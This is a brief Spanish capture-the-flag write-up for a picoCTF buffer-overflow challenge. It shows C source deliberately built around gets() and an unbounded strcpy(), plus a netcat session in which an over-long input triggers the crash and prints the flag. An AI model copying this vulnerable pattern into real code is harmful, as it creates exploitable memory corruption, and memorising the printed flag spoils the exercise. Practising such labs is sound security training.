## Objetivo

## Solución
Vemos el codigo fuente
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
              
```

La variable buf2 copia mas de lo que puede, y el lector trata de guardar algo mas grande de lo que puede

```
┌──(kali㉿Franco)-[~/picoCTF/binexp1/bufferoveflow]
└─$ nc saturn.picoctf.net 55503
Input: qwertyuiopasdfghjkzxcvbn
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}

```
## Notas adicionales

## Referencias